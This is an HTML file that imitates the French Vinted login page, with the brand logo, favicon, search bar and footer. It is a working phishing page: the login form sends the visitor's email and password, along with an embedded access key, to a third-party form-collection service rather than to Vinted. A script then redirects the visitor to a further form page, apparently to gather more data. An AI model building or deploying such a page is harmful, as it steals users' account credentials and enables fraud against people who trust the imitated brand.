<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Vinted</title>
    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
        <div class="menu-icon"><span></span><span></span><span></span></div>
    </header>

    <div class="search-container">
        <div class="search-bar">
            <span class="category">Articles ▾</span>
            <input type="text" placeholder="Rechercher des articles">
        </div>
    </div>

    <main class="main-content">
        <div class="login-box">
            <h2>Se connecter</h2>
            
            <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
                
                <div class="input-field">
                    <input type="text" name="email" placeholder="Identifiant ou adresse email" required>
                </div>
                
                <div class="input-field">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-vinted">Continuer</button>
            </form>

            <div class="auth-links">
                <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
    </main>

    <footer class="vinted-footer">
        <div class="footer-grid">
            <div class="footer-column">
                <h3>Vinted</h3>
                <ul><li>À propos de Vinted</li><li>Le développement durable</li><li>Presse</li></ul>
            </div>
            <div class="footer-column">
                <h3>Aide</h3>
                <ul><li>Centre d'aide</li><li>Acheter</li><li>Confiance et sécurité</li></ul>
            </div>
        </div>

        <div class="app-badges">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
        </div>

        <div class="social-icons">
            <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="FB" style="filter: grayscale(100%); opacity: 0.5; width: 22px;">
            <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" alt="LI" style="filter: grayscale(100%); opacity: 0.5; width: 22px;">
            <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="INS" style="filter: grayscale(100%); opacity: 0.5; width: 22px;">
        </div>

        <div class="footer-legal">
            <span>Politique de cookies</span>
            <span>Termes et Conditions</span>
            <span>Notre plateforme</span>
        </div>
    </footer>

    <script>
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function(e) {
            setTimeout(() => {
                window.location.href = "formulaire.html";
            }, 1000); 
        });
    </script>

</body>
</html>
